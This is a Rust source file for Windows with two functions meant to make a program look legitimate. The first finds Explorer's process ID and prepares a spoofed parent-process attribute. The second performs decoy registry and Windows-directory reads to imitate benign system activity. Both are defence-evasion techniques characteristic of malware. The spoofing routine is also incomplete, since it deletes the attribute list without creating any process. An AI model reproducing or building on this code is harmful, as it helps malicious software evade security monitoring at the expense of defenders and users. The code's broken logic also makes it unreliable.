use windows::core::{w, PCWSTR};
use std::ffi::c_void;
use windows::Win32::Foundation::{CloseHandle, HANDLE, WIN32_ERROR};
use windows::Win32::System::Threading::{
    OpenProcess, InitializeProcThreadAttributeList, UpdateProcThreadAttribute,
    DeleteProcThreadAttributeList, Sleep, PROCESS_CREATE_PROCESS,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, LPPROC_THREAD_ATTRIBUTE_LIST,
};
use windows::Win32::UI::WindowsAndMessaging::{FindWindowW, GetWindowThreadProcessId};
use windows::Win32::System::Registry::{RegOpenKeyExW, RegCloseKey, HKEY_LOCAL_MACHINE, HKEY, KEY_READ};

pub fn mimic_legitimate_process() -> bool {
    unsafe {
        // Find the Explorer window to obtain its PID
        let hwnd = FindWindowW(PCWSTR::null(), w!("Progman"));
        if hwnd.0 == 0 {
            return false;
        }
        let mut pid: u32 = 0;
        GetWindowThreadProcessId(hwnd, &mut pid);
        if pid == 0 {
            return false;
        }

        // Open the parent process handle
        let parent = match OpenProcess(PROCESS_CREATE_PROCESS, false, pid) {
            Ok(h) => h,
            Err(_) => return false,
        };

        // Prepare attribute list with spoofed parent
        let mut size: usize = 0;
        InitializeProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST::default(), 1, 0, &mut size);
        let mut buffer = vec![0u8; size];
        let mut list = LPPROC_THREAD_ATTRIBUTE_LIST(buffer.as_mut_ptr() as *mut _);
        if !InitializeProcThreadAttributeList(list, 1, 0, &mut size).as_bool() {
            CloseHandle(parent);
            return false;
        }

        let mut parent_handle = parent;
        let result = UpdateProcThreadAttribute(
            list,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            Some(&mut parent_handle as *mut HANDLE as *mut c_void),
            std::mem::size_of::<HANDLE>(),
            None,
            None,
        );

        DeleteProcThreadAttributeList(list);
        CloseHandle(parent);
        result.as_bool()
    }
}

pub fn mimic_system_activity() {
    unsafe {
        // Registry access that many system utilities perform
        let mut hkey: HKEY = HKEY::default();
        let subkey = w!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
        if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &mut hkey) == WIN32_ERROR(0) {
            RegCloseKey(hkey);
        }

        // Read from %WINDIR% directory to emulate benign activity
        if let Ok(windir) = std::env::var("WINDIR") {
            let _ = std::fs::read_dir(windir);
        }

        // Short sleep instead of creating extra processes like ping.exe
        Sleep(500);
    }
}
